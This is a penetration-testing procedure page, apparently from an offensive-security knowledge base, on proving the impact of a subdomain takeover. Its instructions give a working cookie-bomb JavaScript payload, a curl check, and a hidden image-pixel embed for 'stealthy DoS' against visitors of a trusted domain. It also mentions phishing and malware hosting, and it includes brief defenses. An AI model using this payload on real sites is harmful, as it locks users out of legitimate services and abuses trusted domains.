---
id: p-demonstrate-takeover-impact
tags:
  - dos
  - phishing
  - proof-of-concept
  - cookies
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Privilege Escalation]]'
commands:
  - '[[commands/curl-http-check]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Endpoint Denial of Service]]'
updated_at: '2025-12-14T04:38:49.237Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Privilege Escalation]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Endpoint Denial of Service]]'
---
# Demonstrate Subdomain Takeover Impact

## Summary

This procedure hosts malicious content on the taken-over subdomain to prove impact, such as setting large cookies for DoS or simulating phishing/malware distribution on a trusted domain like firefox.com.

## Description

After claiming, upload HTML/JS to set oversized cookies (e.g., 100KB), blocking access to legitimate sites via cookie overflow. In the report, this was shown via http://████/large-cookies.html; CAA records blocked SSL. Outcomes include disrupted user access and trust exploitation.

## Requirements

1. Control over claimed resource
2. File upload access on hosting service
3. Browser for testing cookie effects

## Defense

Defensive measures and detection strategies:

- Monitor for anomalous traffic from subdomains
- Enforce cookie size limits in browsers
- Use HSTS and CAA to prevent cert abuse

## Objectives

1. Prove DoS via cookie manipulation
2. Simulate phishing or malware hosting
3. Highlight non-secure cookie reading risks

## Instructions

### Step 1: Host Malicious Content

**Context**: Upload an HTML file setting large cookies.

No command; use service upload: Create large-cookies.html with <script>document.cookie = 'key=' + 'A'.repeat(100000);</script>

### Step 2: Test Impact

**Context**: Verify by fetching and observing effects.

**Command** ([[commands/curl-http-check]]):
```bash
curl http://████/large-cookies.html
```

> Expected: HTML/JS response; visit in browser to see cookie set, then attempt www.firefox.com access (blocked).

### Step 3: Alternative via Pixel

**Context**: Embed as tracking pixel for stealthy DoS.

Embed <img src="http://████/large-cookies.html"> in a page; load triggers cookies.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access
- [[Privilege Escalation]] Privilege Escalation (via trust)

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[Endpoint Denial of Service]] Endpoint Denial of Service

### Sub-Techniques


## Commands Used

- [[commands/curl-http-check]]

## Tools Used


## Tags

- [[dos]]
- [[Phishing]]
